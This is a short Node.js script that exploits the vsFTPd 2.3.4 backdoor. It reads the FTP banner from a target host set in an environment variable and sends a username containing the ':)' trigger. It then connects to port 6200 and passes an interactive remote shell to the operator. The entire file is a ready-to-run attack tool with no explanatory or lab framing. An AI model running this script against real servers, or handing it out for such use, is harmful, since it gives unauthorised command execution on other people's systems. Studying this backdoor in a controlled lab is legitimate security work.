import dotenv from "dotenv"
dotenv.config()
import net from "net"
import readline from "readline";

const client = new net.Socket();
const cmd = new net.Socket();
const rl = readline.createInterface({
  input: process.stdin, 
  output: process.stdout,
})

function command(){
  rl.question("", (input) => {
    cmd.write(input + "\n")
    command()
  })
}

cmd.on("data", (data) => {
  console.log(data.toString())
})

var index = false
client.on('data', (data) => {
  if (index != true) {
    index = true
    if (data.toString() == "220 (vsFTPd 2.3.4)\r\n") {
      console.log("[+] FTP Version 2.3.4")
      client.write("USER user:)\nPASS pass\n")
      cmd.connect(6200, process.env.FTP_HOST, () => {
        client.destroy()
        console.log("[+] Shell Successfully Retrieved")
        command()
      })
    }
    else {
      console.log("[-] FTP Version Not 2.3.4")
      client.destroy()
    }
  }
})

client.connect(21, process.env.FTP_HOST, () => {
  console.log("[*] FTP Connected")
})
